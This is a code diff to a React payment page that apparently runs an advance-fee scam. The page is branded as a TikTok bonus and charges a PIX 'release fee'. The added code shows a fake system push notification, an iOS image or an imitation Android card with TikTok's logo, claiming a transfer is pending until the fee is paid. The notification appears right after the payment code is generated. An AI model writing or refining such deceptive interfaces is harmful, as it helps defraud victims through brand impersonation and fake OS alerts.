@@ -10,6 +10,7 @@ import { getUtms } from "@/lib/utm";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import tiktokRound from "@/assets/tiktok-round.png";
 import pixLogo3 from "@/assets/pix-logo-icon-3.png";
+import notifIos from "@/assets/notif-ios.png";
 import testimonialMatheus from "@/assets/testimonial-matheus.png";
 import testimonialAna from "@/assets/testimonial-ana.png";
 import testimonialCarlos from "@/assets/testimonial-carlos.png";
@@ -48,6 +49,11 @@ const Pagamento = () => {
     transaction_id: number;
   } | null>(null);
   const [copied, setCopied] = useState(false);
+  const [showNotification, setShowNotification] = useState(false);
+  const [exitingNotification, setExitingNotification] = useState(false);
+  const [dismissNotification, setDismissNotification] = useState(false);
+
+  const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
 
   const handlePagar = async () => {
     setLoading(true);
@@ -86,6 +92,10 @@ const Pagamento = () => {
           qr_code_base64: data.qr_code_base64,
           transaction_id: data.transaction_id,
         });
+        // Show push notification
+        setShowNotification(true);
+        setTimeout(() => setExitingNotification(true), 5000);
+        setTimeout(() => setDismissNotification(true), 5400);
         trackTikTokEvent({ event: "CompletePayment", properties: { value: TAX, currency: "BRL", transaction_id: data.transaction_id } });
       } else {
         throw new Error(data?.error || "Erro ao gerar pagamento");
@@ -114,7 +124,62 @@ const Pagamento = () => {
 
 
   return (
-    <div className="flex min-h-screen flex-col bg-gray-50">
+    <div className="flex min-h-screen flex-col bg-gray-50 relative">
+      {/* Simulated Push Notification - appears after PIX generation */}
+      {showNotification && !dismissNotification && (
+        <div
+          className="fixed z-[9999] cursor-pointer"
+          onClick={() => {
+            setExitingNotification(true);
+            setTimeout(() => setDismissNotification(true), 400);
+          }}
+          style={{
+            animation: exitingNotification
+              ? "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards"
+              : "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
+            top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
+            left: isIOS ? "6px" : "12px",
+            right: isIOS ? "6px" : "12px",
+          }}
+        >
+          {isIOS ? (
+            <img
+              src={notifIos}
+              alt="Transferência pendente"
+              className="w-full max-w-md mx-auto rounded-[22px]"
+              style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
+              loading="eager"
+              decoding="async"
+            />
+          ) : (
+            <div
+              className="rounded-2xl p-4 mx-auto max-w-md"
+              style={{
+                fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
+                background: "#2a2a2e",
+                boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
+              }}
+            >
+              <div className="flex items-center gap-2 mb-2">
+                <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
+                <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
+                <span className="text-[11px] text-white/35 mx-0.5">•</span>
+                <span className="text-[11px] text-white/35">agora</span>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className="flex-1 min-w-0">
+                  <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Transferência pendente</p>
+                  <p className="text-[13px] text-white/70 leading-snug">
+                    Transferência no valor de R$ {SALDO.toFixed(2).replace(".", ",")} aguardando pagamento da taxa de liberação.
+                  </p>
+                </div>
+                <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
+              </div>
+            </div>
+          )}
+        </div>
+      )}
+
       {/* Top banner */}
       <div className="bg-primary py-3 text-center">
         <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
